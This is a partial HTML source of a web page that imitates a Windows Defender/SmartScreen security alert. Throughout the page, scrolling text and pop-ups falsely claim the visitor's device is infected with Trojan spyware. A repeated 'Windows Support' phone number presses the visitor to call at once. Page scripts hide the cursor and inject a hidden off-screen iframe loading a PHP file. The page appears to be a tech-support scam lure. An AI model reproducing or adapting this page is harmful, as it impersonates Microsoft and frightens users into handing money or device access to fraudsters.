...
<head>
  ...
  <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-232668117-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-232668117-1');
</script>
    ...
    <div class="row">
            ...
            <div class="right-foot" style="text-align: center;">
                <span id="footertxt"><img src="microsoft.png"> Windows: </span><span
                        style="font-weight: 700;padding-left: 13px;color: #fff;">Contact Support <span
                            style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">+1-808-215-3446
        ...
        <div class="col-md-12">
            <marquee width="100%" direction="left" height="100px"><small class="text-left"
                                                                         style="color: #eee;font-size: 14px;">An unidentified software was prohibited from stating by Windows Defender SmartScreen. Running this application could endanger your System. This device may be infected with potentially harmful adware that can steal your passwords, online identities, financial information, personal data, photos, and documents.</small></marquee>
        </div>
    </div>
...
<div id="poptxt" class="lightbox">
    ...
    <div id="txtintro">
                <span class="colo-rd">App: Ads.fiancetrack(#02).dll<br>
    ...
    <div id="disclaimer">
        ...
        <span class="support">Contact Windows Support: +1-808-215-3446
...
<div id="pop_up_new" class="cardcontainer" style="cursor: none;">
    ...
    <p>Your machine has notified us that it has a Trojan spyware infection. The following information has been tampered with.</p>
    ...
    <p>This device has possibly undesirable adware that can steal your passwords, online identities, financial information, personal files, images, or documents, according to Windows-Defender Scan.</p>
    <p>In order for our professionals to guide you through the removal process over the phone, you must get in touch with us very away.</p>
	...
	if(isIEedge|| InternetEx || navigator.appName == 'Microsoft Internet Explorer' ||  !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/)))
		{
			 ...
			 function msg_ff() {
						...
						i.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="H0dd02.php"></iframe></div>';
